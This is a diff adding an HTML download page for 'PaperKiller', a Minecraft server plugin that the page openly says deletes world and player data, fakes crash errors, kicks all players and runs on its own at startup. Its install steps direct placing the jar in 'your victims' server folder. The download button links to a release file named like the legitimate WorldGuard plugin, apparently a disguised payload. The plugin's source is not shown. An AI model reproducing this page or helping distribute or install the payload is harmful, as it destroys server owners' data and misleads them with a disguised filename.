@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PaperKiller Plugin Details</title>
+    <link rel="stylesheet" href="details.css">
+    <link rel="icon" href="favicon.png">
+</head>
+<body>
+    <header>
+        <a href="index.html">Back to Home</a>
+        <h1>PaperKiller</h1>
+    </header>
+    <main>
+        <section id="resource-details">
+            <h2>Installation</h2>
+            <p>
+                To install the <strong>PaperKiller</strong> plugin, follow these steps:
+                <ol>
+                    <li><strong>Download</strong> the plugin file from the official source.</li>
+                    <li>Place the downloaded <code>.jar</code> file into the <code>"plugins"</code> folder of your victims Minecraft server directory.</li>
+                    <li><strong>Restart</strong> the Minecraft server to activate the plugin.</li>
+                </ol>
+            </p>
+            <h2>What it does</h2>
+            <p>
+                The <strong>PaperKiller</strong> plugin performs several destructive actions:
+                <ul>
+                    <li><strong>Deletes World Data:</strong> Removes region files, player data, and essential world folders from the server.</li>
+                    <li><strong>Spams Errors:</strong> Continuously sends fake Paper server errors to simulate a crash.</li>
+                    <li><strong>Kicks All Players:</strong> Kicks all players from the server after deletion.</li>
+                    <li><strong>Final Actions:</strong> Displays a large "FINAL KILL" message in ASCII art for that dramatic effect, runs the Java garbage collector to clear memory, therefor deleting all cached code in the ram. :D</li>
+                </ul>
+            </p>
+            <h2>How to use</h2>
+            <p>
+                After installing the plugin:
+                <ul>
+                    <li>It will automatically begin executing its actions upon server startup, performing the tasks described.</li>
+                </ul>
+                <strong>Note:</strong> This plugin is designed to completely destroy server data and functionality. Use with extreme caution. Ensure you have backups of all important data before installation.
+            </p>
+            <h2>Compatibility</h2>
+            <p>
+                The <strong>PaperKiller</strong> plugin is compatible with Minecraft versions 1.19 through 1.21. It has not been tested on versions below 1.20.
+            </p>
+            <button id="download-btn" onclick="window.location.href='https://github.com/iscrit/copium/releases/download/Diepaper/worldguard-bukkit-7.0.10-dist.jar'">Download</button>
+            <div id="progress-container" style="display: none;"> 
+                <div id="progress-circle"></div>
+                <div id="progress-text">0%</div>
+            </div>
+        </section>
+    </main>
+    <script src="script.js"></script>
+</body>
+</html>
